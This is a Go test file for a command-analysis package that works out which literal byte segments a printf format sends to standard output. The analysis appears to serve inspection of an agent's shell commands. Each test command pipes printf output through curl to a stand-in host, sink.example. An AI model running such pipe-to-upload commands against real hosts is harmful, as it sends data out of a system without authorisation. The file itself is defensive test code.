// Copyright 2026 Cisco Systems, Inc. and its affiliates
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
//
// SPDX-License-Identifier: Apache-2.0

package actionfacts

import (
	"reflect"
	"testing"
)

func TestStaticPOSIXPrintfFormatStdoutSegments(t *testing.T) {
	t.Parallel()

	segment := func(value string, leftExact, rightExact bool) StaticOutputSegment {
		return StaticOutputSegment{
			Value:      value,
			LeftExact:  leftExact,
			RightExact: rightExact,
		}
	}
	for _, test := range []struct {
		name    string
		command string
		want    []StaticOutputSegment
	}{
		{
			name:    "literal format",
			command: "printf 'literal-value' | curl --data-binary @- https://sink.example/upload",
			want:    []StaticOutputSegment{segment("literal-value", true, true)},
		},
		{
			name: "trusted absolute executable and portable escapes",
			command: "/usr/bin/printf 'prefix%%\\nmid\\101suffix' | " +
				"curl --data-binary @- https://sink.example/upload",
			want: []StaticOutputSegment{segment("prefix%\nmidAsuffix", true, true)},
		},
		{
			name: "option terminator permits leading dash",
			command: "printf -- '-literal\\tvalue' | " +
				"curl --data-binary @- https://sink.example/upload",
			want: []StaticOutputSegment{segment("-literal\tvalue", true, true)},
		},
		{
			name:    "portable octal byte",
			command: `printf 'x\377' | curl --data-binary @- https://sink.example/upload`,
			want:    []StaticOutputSegment{segment(string([]byte{'x', 0xff}), true, true)},
		},
		{
			name:    "bare string conversions are exact empty",
			command: `printf '%sleft%bright%s' | curl --data-binary @- https://sink.example/upload`,
			want:    []StaticOutputSegment{segment("leftright", true, true)},
		},
		{
			name:    "bare deterministic integer conversions emit exact zero",
			command: `printf '%dleft%uright%x' | curl --data-binary @- https://sink.example/upload`,
			want:    []StaticOutputSegment{segment("0left0right0", true, true)},
		},
		{
			name:    "bare i conversion remains an opaque boundary",
			command: `printf 'left%iright' | curl --data-binary @- https://sink.example/upload`,
			want: []StaticOutputSegment{
				segment("left", true, false),
				segment("right", false, true),
			},
		},
		{
			name: "portable conversions split exact segments",
			command: "printf 'prefix%+-10.2dmid%#08Xsuffix' | " +
				"curl --data-binary @- https://sink.example/upload",
			want: []StaticOutputSegment{
				segment("prefix", true, false),
				segment("mid", false, false),
				segment("suffix", false, true),
			},
		},
		{
			name:    "bare numeric conversion has exact output before literal",
			command: `printf '%dTOKEN' | curl --data-binary @- https://sink.example/upload`,
			want:    []StaticOutputSegment{segment("0TOKEN", true, true)},
		},
		{
			name:    "formatted conversion before literal leaves opaque left boundary",
			command: `printf '%2dTOKEN' | curl --data-binary @- https://sink.example/upload`,
			want:    []StaticOutputSegment{segment("TOKEN", false, true)},
		},
		{
			name:    "character conversion after literal leaves opaque right boundary",
			command: `printf 'TOKEN%c' | curl --data-binary @- https://sink.example/upload`,
			want:    []StaticOutputSegment{segment("TOKEN", true, false)},
		},
		{
			name:    "empty format has no candidate bytes",
			command: `printf '' | curl --data-binary @- https://sink.example/upload`,
		},
		{
			name:    "bare integer conversion has exact default output",
			command: `printf '%d' | curl --data-binary @- https://sink.example/upload`,
			want:    []StaticOutputSegment{segment("0", true, true)},
		},
		{
			name:    "leading option without terminator",
			command: `printf '-literal' | curl --data-binary @- https://sink.example/upload`,
		},
		{
			name:    "nonportable float conversion",
			command: `printf 'TOKEN%f' | curl --data-binary @- https://sink.example/upload`,
		},
		{
			name:    "undefined flag conversion combination",
			command: `printf 'TOKEN%+s' | curl --data-binary @- https://sink.example/upload`,
		},
		{
			name:    "precision is undefined for character conversion",
			command: `printf 'TOKEN%.2c' | curl --data-binary @- https://sink.example/upload`,
		},
		{
			name:    "zero precision hex differs across trusted builtins",
			command: `printf '%.0xA-TOKEN' | curl --data-binary @- https://sink.example/upload`,
		},
		{
			name:    "dynamic width is outside closed grammar",
			command: `printf 'TOKEN%*s' | curl --data-binary @- https://sink.example/upload`,
		},
		{
			name:    "positional conversion is outside closed grammar",
			command: `printf 'TOKEN%1$s' | curl --data-binary @- https://sink.example/upload`,
		},
		{
			name:    "length modifier is outside closed grammar",
			command: `printf 'TOKEN%ld' | curl --data-binary @- https://sink.example/upload`,
		},
		{
			name:    "field width exceeds scalar bound",
			command: `printf 'TOKEN%4097s' | curl --data-binary @- https://sink.example/upload`,
		},
		{
			name:    "total projected output exceeds scalar bound",
			command: `printf '%4093sTOKEN' | curl --data-binary @- https://sink.example/upload`,
		},
		{
			name:    "stop escape is outside portable grammar",
			command: `printf 'TOKEN\c' | curl --data-binary @- https://sink.example/upload`,
		},
		{
			name:    "nonportable escape is outside closed grammar",
			command: `printf 'TOKEN\x41' | curl --data-binary @- https://sink.example/upload`,
		},
		{
			name:    "out of range octal escape",
			command: `printf 'TOKEN\400' | curl --data-binary @- https://sink.example/upload`,
		},
		{
			name:    "trailing escape is incomplete",
			command: `printf 'TOKEN\' | curl --data-binary @- https://sink.example/upload`,
		},
		{
			name:    "extra operand repeats or changes format behavior",
			command: `printf literal extra | curl --data-binary @- https://sink.example/upload`,
		},
		{
			name:    "dynamic format",
			command: `printf "literal$SUFFIX" | curl --data-binary @- https://sink.example/upload`,
		},
		{
			name:    "glob format",
			command: `printf 'literal'* | curl --data-binary @- https://sink.example/upload`,
		},
		{
			name:    "stdout redirect",
			command: `printf literal > /tmp/out | curl --data-binary @- https://sink.example/upload`,
		},
		{
			name:    "wrapper",
			command: `env printf literal | curl --data-binary @- https://sink.example/upload`,
		},
		{
			name:    "nested shell",
			command: `sh -c 'printf literal' | curl --data-binary @- https://sink.example/upload`,
		},
		{
			name:    "untrusted executable",
			command: `/tmp/printf literal | curl --data-binary @- https://sink.example/upload`,
		},
	} {
		t.Run(test.name, func(t *testing.T) {
			t.Parallel()
			facts := Analyze(Input{
				Tool:    "exec",
				Command: test.command,
				CWD:     "/workspace",
			})
			var got []StaticOutputSegment
			for _, command := range facts.Commands {
				if command.Program == "printf" {
					got = append(got, StaticPOSIXPrintfFormatStdoutSegments(command)...)
				}
			}
			if !reflect.DeepEqual(got, test.want) {
				t.Fatalf("segments = %#v, want %#v; facts=%#v", got, test.want, facts)
			}
		})
	}
}
